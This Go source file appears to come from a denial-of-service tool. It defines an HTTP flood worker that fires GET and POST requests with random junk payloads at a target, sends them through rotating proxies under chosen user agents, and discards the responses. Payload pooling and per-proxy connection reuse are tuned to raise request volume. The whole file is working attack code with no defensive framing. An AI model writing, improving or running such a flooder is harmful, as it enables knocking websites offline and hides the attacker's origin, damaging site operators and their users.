package http

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"sync"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// Pre-generated payload pool to avoid per-request allocations and GC pressure
const payloadPoolSize = 16

var (
	payloadPool     [payloadPoolSize]string
	payloadPoolOnce sync.Once
)

func initPayloadPool() {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	for i := range payloadPool {
		b := make([]byte, 512)
		for j := range b {
			b[j] = letters[r.Intn(len(letters))]
		}
		payloadPool[i] = string(b)
	}
}

type floodWorker struct {
	clients sync.Map // proxy key -> *http.Client (connection pooling)
}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

// proxyKey returns a unique key for caching HTTP clients per proxy.
func proxyKey(p core.Proxy) string {
	if p.Host == "" {
		return "<direct>"
	}
	return fmt.Sprintf("%s://%s:%d", p.Protocol, p.Host, p.Port)
}

// getClient returns a cached HTTP client for the given proxy, creating one if needed.
// This allows TCP/TLS connection reuse (keep-alive) across requests, which is
// the single biggest performance win — avoids handshake overhead per request.
func (w *floodWorker) getClient(p core.Proxy) *http.Client {
	key := proxyKey(p)
	if c, ok := w.clients.Load(key); ok {
		return c.(*http.Client)
	}
	client := netutil.DialedHTTPClient(p, 5*time.Second, 3)
	actual, _ := w.clients.LoadOrStore(key, client)
	return actual.(*http.Client)
}

func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	payloadPoolOnce.Do(initPayloadPool)

	// Use pre-parsed target node for L7 URL
	u := params.TargetNode.ToURL()
	target := u.String()
	// Reuse client per proxy for connection pooling
	client := w.getClient(p)
	// random boolean, but favor POST if packetSize > 512
	isGet := params.PacketSize <= 512 && rand.Intn(2) == 0
	// Use pre-generated payload from pool instead of allocating new string each time
	payload := payloadPool[rand.Intn(payloadPoolSize)]
	if params.PacketSize > 0 && params.PacketSize < len(payload) {
		payload = payload[:params.PacketSize]
	}
	var req *http.Request
	var err error
	if isGet {
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, target+"/"+payload, nil)
	} else {
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, target, io.NopCloser(bytes.NewBufferString(payload)))
	}
	if err != nil {
		return err
	}
	if ua != "" {
		req.Header.Set("User-Agent", ua)
	}

	// Fire and forget; ignore response body content
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		// Send log only if request was successful and verbose is enabled
		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
	}
	return nil
}
